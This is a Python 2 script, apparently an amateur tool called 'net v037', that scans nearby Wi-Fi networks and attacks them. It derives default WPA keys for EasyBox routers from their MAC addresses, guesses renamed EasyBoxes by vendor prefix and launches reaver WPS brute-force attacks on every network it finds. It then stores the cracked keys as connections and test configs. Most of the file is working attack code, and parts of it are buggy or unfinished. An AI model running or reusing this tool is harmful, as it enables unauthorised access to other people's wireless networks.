#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import dbus
import string
import subprocess
import sys
import pprint
import time
import os
from uuid import uuid4

bus = dbus.SystemBus()
proxy = bus.get_object("org.freedesktop.NetworkManager", "/org/freedesktop/NetworkManager")
manager = dbus.Interface(proxy, "org.freedesktop.NetworkManager")

scanned_bssids = []
scanned_ap_details=[["", "", "", "", "", ""],]

csv_id = 0
csv_data=[["ID", "SSID", "BSSID", "ENC", "SPEED", "STRENGTH", "PASS", "---", "---", "---", "---", "---", "---"],]

channel_to_frequency_table = [ [2412, 2417, 2422, 2427, 2432, 2437, 2442, 2447, 2452, 2457, 2462, 2467, 2472, 2484, 5220], [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 88] ]

def scan_bssids():
	i = 0;
	devices = manager.GetDevices()
	for d in devices:
	    print " > Scanning Device : "+d
	    dev_proxy = bus.get_object("org.freedesktop.NetworkManager", d)
	    prop_iface = dbus.Interface(dev_proxy, "org.freedesktop.DBus.Properties")
	    # Make sure the device is enabled before we try to use it
	    state = prop_iface.Get("org.freedesktop.NetworkManager.Device", "State")
	    if state <= 2:
	        continue
	    # Get device's type; we only want wifi devices
	    iface = prop_iface.Get("org.freedesktop.NetworkManager.Device", "Interface")
	    dtype = prop_iface.Get("org.freedesktop.NetworkManager.Device", "DeviceType")
	    if dtype == 2:   # WiFi
	        wifi_iface = dbus.Interface(dev_proxy, "org.freedesktop.NetworkManager.Device.Wireless")
	        wifi_prop_iface = dbus.Interface(dev_proxy, "org.freedesktop.DBus.Properties")
	        connected_path = wifi_prop_iface.Get("org.freedesktop.NetworkManager.Device.Wireless", "ActiveAccessPoint")
	        aps = wifi_iface.GetAccessPoints()
	        for path in aps:
        	    ap_proxy      = bus.get_object("org.freedesktop.NetworkManager", path)
	            ap_prop_iface = dbus.Interface(ap_proxy, "org.freedesktop.DBus.Properties")
	            bssid         = ap_prop_iface.Get("org.freedesktop.NetworkManager.AccessPoint", "HwAddress")
	            ssid          = ap_prop_iface.Get("org.freedesktop.NetworkManager.AccessPoint", "Ssid")
	            bitrate       = ap_prop_iface.Get("org.freedesktop.NetworkManager.AccessPoint", "MaxBitrate")
	            strength      = ap_prop_iface.Get("org.freedesktop.NetworkManager.AccessPoint", "Strength")
		    frequency     = ap_prop_iface.Get("org.freedesktop.NetworkManager.AccessPoint", "Frequency")
	            if not bssid in scanned_bssids:
	                scanned_bssids.append(bssid)
	                scanned_ap_details[i][0] = (int)(i)
	                scanned_ap_details[i][1] = (str)("".join(chr(b) for b in ssid))
	                scanned_ap_details[i][2] = (str)(bssid)
	                scanned_ap_details[i][3] = (int)(bitrate)
	                scanned_ap_details[i][4] = (int)(strength)
	                scanned_ap_details[i][5] = (int)(frequency)
	                i += 1
        	        scanned_ap_details.append(["", "", "", "", "", ""],)
	scanned_ap_details.remove(scanned_ap_details[-1])
	return i;

# generate default key from mac address
def easy_box_keygen(mac):
	bytes = [int(x, 16) for x in mac.split(':')]

	c1 = (bytes[-2] << 8) + bytes[-1]
	(s6, s7, s8, s9, s10) = [int(x) for x in '%05d' % (c1)]
	(m7, m8, m9, m10, m11, m12) = [int(x, 16) for x in mac.replace(':', '')[6:]]

	k1 = (s7 + s8 + m11 + m12) & (0x0F)
	k2 = (m9 + m10 + s9 + s10) & (0x0F)

	x1 = k1 ^ s10
	x2 = k1 ^ s9
	x3 = k1 ^ s8
	y1 = k2 ^ m10
	y2 = k2 ^ m11
	y3 = k2 ^ m12
	z1 = m11 ^ s10
	z2 = m12 ^ s9
	z3 = k1 ^ k2

	bssid = "EasyBox-%1x%1x%1x%1x%1x%1x" % (m7, m8, m9, m10, s6, s10)

	return "%X%X%X%X%X%X%X%X%X" % (x1, y1, z1, x2, y2, z2, x3, y3, z3)

def count_easy_boxes():
	j = 0;
	for i in range(0, len(scanned_ap_details)):
		tmpstr = (str)(scanned_ap_details[i][1])
		if tmpstr.find('EasyBox-') == 0:
			j += 1
	return j;

def guess_easy_boxes():
	arcadyan_mac_prefixes = [ "00:12:BF", "00:1A:2A", "00:1D:19", "00:23:08", "00:26:4D", "1C:C6:3C", "50:7E:5D", "74:31:70", "7C:4F:B5", "88:25:2C" ]
	for i in range(0, len(scanned_ap_details)):
		tmpstr = (str)(scanned_ap_details[i][2])
		for bssids in range(0, len(arcadyan_mac_prefixes)):
			#print tmpstr+"---"+arcadyan_mac_prefixes[bssids]
			if tmpstr.find(arcadyan_mac_prefixes[bssids]) == 0:
				maybe_ssid = scanned_ap_details[i][1]
				maybe_bssid = scanned_ap_details[i][2]
				maybe_pass = easy_box_keygen(scanned_ap_details[i][2])
				if maybe_ssid.find("EasyBox-") != 0:
					print "     Maybe found an EasyBox? SSID='"+maybe_ssid+"' BSSID='"+ maybe_bssid +"' PASS='"+maybe_pass+"'"
					#csv_data[["ID", "SSID", "BSSID", "ENC", "SPEED", "STRENGTH", "PASS", "", "", "", "", "", ""],]
					csv_data.append(["-???-", maybe_ssid, maybe_bssid, "WPA/WPA2", "unknown", "unknown", maybe_pass, "", "", "", "", "", ""],)
	j = 0;
	return j;

def crack_easy_boxes():
        j = 0;
        for i in range(0, len(scanned_ap_details)):
                tmpstr = (str)(scanned_ap_details[i][1])
                if tmpstr.find('EasyBox-') == 0:
			ssid = scanned_ap_details[i][1]
			bssid = scanned_ap_details[i][2]
			wpass = easy_box_keygen(bssid)
			print "     cracking SSID='"+ssid+"' BSSID='"+bssid+"' PASS='"+wpass+"'"
                        csv_data.append(["-----", ssid, bssid, "WPA/WPA2", "unknown", "unknown", wpass, "", "", "", "", "", ""],)
			j += 1
        return j;

def nm():
	j = 0;
	for i in range(0, len(scanned_ap_details)):
		tmpstr = (str)(scanned_ap_details[i][1])
		if tmpstr.find('EasyBox-') == 0:
			ssid = scanned_ap_details[i][1]
			bssid = scanned_ap_details[i][2]
			wpass = easy_box_keygen(bssid)
			print " adding connection: "+ssid+" "+bssid+" "+wpass
			config = "[connection]\nid="+ssid+"\nuuid="+(str(uuid4()))+"\ntype=802-11-wireless\nzone=\n\n[802-11-wireless]\nssid="+ssid+"\nmode=infrastructure\n"
			config = config + "security=802-11-wireless-security\n\n[802-11-wireless-security]\nkey-mgmt=wpa-psk\npsk="+wpass+"\n\n[ipv4]\nmethod=auto\nmay-fail=false\n\n"
			config = config + "[ipv6]\nmethod=ignore\n\n"
			print config
			print " writing this config to /etc/NetworkManager/system-connections/"
			filename = "/etc/NetworkManager/system-connections/_"+ssid
			print " filename : "+filename
			fobj = open(filename, "w")
			fobj.write(config)
			fobj.close()
			j += 1
	return 0;

def crack_wps(bssid, channel, interface):
	cmdline = "/usr/bin/reaver -vv -i "+interface+" -c "+(str)(channel)+" -b "+bssid
	print " > $ "+cmdline
	os.system(cmdline)
	return 0;
       
if __name__ == "__main__":
    print "net v037 (c) 2012,2013 Nils Stec"
    arguments = len(sys.argv)-1
    arg = 1
    csv_id = 0
    crack_easy_box = 0
    easy_box_guess = 0
    do_test = 0
    do_wps = 0
    write_csv = 0
    write_csv_file = "./log-" + (str)(time.time()) + ".csv"
    while arg <= arguments:
	if sys.argv[arg] == "--help":
	    print " net v037 is a tool, which scans for EasyBox-APs, calculates the default WPA/WPA2-PSK"
	    print " and can test them by itself. All interfaces you want to use have to be accessible by"
	    print " network-manager, because we scan and try to connect with nm."
	    print " some users may think this is overload or anything else - fuck you, this was the simplest way!\n"
	    print "command line options:\n\
		--help			\n\
		--do-nm			\n\
		--easy-box		- do an easy-box attack on every reachable easybox\n\
		--easy-box-guess	- guess from mac address which AP is a (renamed) EasyBox\n\
		--write-csv		- finally all cracked APs will be written to a logfile\n\
		--do-test		- the the found APs directly\n\
		--search-iface <iface>	- use <iface> for wireless search, if not given all accessible\n\
					  network adapters will be used\n\
		--test-iface <iface>    - interface to test APs with, if not given wlan0 will be used\n\
		\n\
		--reaver		- do a reaver test on all BSSIDs\n\
		EasyBox-Cracking works with EasyBox A300,A400,A401,A600,A601,A800,A801,402,602,802,803"
	    sys.exit(0)
	#elif sys.argv[arg] == "--interface":
	#    argarg = sys.argv[arg+1]
	#    print "> adding interface "+argarg
	#    arg += 2
	elif sys.argv[arg] == "--easy-box":
	    print " > cracking easy-box"
	    crack_easy_box = 1
	    arg += 1
	elif sys.argv[arg] == "--easy-box-guess":
	    print " > guessing easy boxes by BSSID additionally"
	    easy_box_guess = 1
	    arg += 1
	elif sys.argv[arg] == '--do-test':
	    print " > testing cracked passes after running"
	    do_test = 1
	    arg += 1
	elif sys.argv[arg] == "--write-csv":
	    print " > writing results to '%s'" % write_csv_file
	    write_csv = 1
	    arg += 1
	elif sys.argv[arg] == "--reaver":
	    print " > doing a reaver test on bssids"
	    do_wps = 1
	    arg += 1
	elif sys.argv[arg] == "--do-nm":
		print " > doing nm connections"
		do_nm = 1
		arg += 1
	else:
	    print "unknown option!\n"
	    sys.exit(-1)
	    
    print " > starting scan for BSSIDs (all on all wireless devices managed by nm)..."
    n_nets = scan_bssids()

    print "  >> found",n_nets,"BSSIDs:"
    for i in range(0, len(scanned_ap_details)):
	frequency 	= scanned_ap_details[i][5]
	num		= scanned_ap_details[i][0]
	ssid		= scanned_ap_details[i][1]
	bssid		= scanned_ap_details[i][2]
	speed		= scanned_ap_details[i][3]/1000
	channel		= (str)(channel_to_frequency_table[1][channel_to_frequency_table[0].index(frequency)])
	strength	= scanned_ap_details[i][4]
    	print "     * ID:%02d"%num,"SSID='%33s"%ssid+"' BSSID='"+bssid+"' speed:",speed,"\bmb/s CH:"+channel+" strength: %02d"%strength,"\b%"


    if do_wps == 1:
	cmdline = "/etc/init.d/network-manager stop"
	print " > $ "+cmdline
	os.system(cmdline)

	cmdline = "iwconfig wlan2 mode monitor"
	print " > $ "+cmdline
	os.system(cmdline)

	cmdline = "ifconfig wlan2 up"
	print " > $ "+cmdline
	os.system(cmdline)
	reaveriface = "wlan2"
	for i in range(0, len(scanned_ap_details)):
		strength = scanned_ap_details[i][4]
		ssid = scanned_ap_details[i][1]
		bssid = scanned_ap_details[i][2]
		channel = channel_to_frequency_table[1][channel_to_frequency_table[0].index(scanned_ap_details[i][5])]
		print " >>>> doing reaver on "+ssid+"-"+bssid+"-ch:",channel,"-str:",strength
		crack_wps(bssid, channel, reaveriface)
	cmdline = "/etc/init.d/network-manager start"
	os.system(cmdline)
    if crack_easy_box == 1:
	easy_boxes = count_easy_boxes();
	print " > starting easy-box-attack on %d networks..." % easy_boxes
	easy_boxes_cracked = crack_easy_boxes()
    #if do_nm == 1:
    #	easy_boxes = count_easy_boxes();
    #	print " > starting easy-box-attack on %d networks and adding all found boxes to NM's system connections..." % easy_boxes
    #	nm()
    if easy_box_guess == 1:
	print " > starting easy-box-attack on other networks with arcadyan BSSIDs (guessing easy boxes)..."
	guess_easy_boxes()
    if write_csv == 1:
	print " > generating output-file in csv-format..."
    if do_test == 1:
	print " > testing WPA keys ..."
	for i in range(1, len(csv_data)):
		ssid = csv_data[i][1] 
		bssid = csv_data[i][2]
		wpa_pass = csv_data[i][6]
		print "################## Testing '"+ssid+"' '"+bssid+"' '"+wpa_pass+"'... ######################"
		
		wpa_cfg = "ctrl_interface=DIR=/var/run/wpa_supplicant\n\
          network={\n\
               ssid=\""+ssid+"\"\n\
               scan_ssid=1 \n\
               key_mgmt=WPA-PSK \n\
               psk=\""+wpa_pass+"\" \n\
          }"
	 	os.system("echo -e '"+wpa_cfg+"' > wpa_test"+(str)(i)+".cfg");

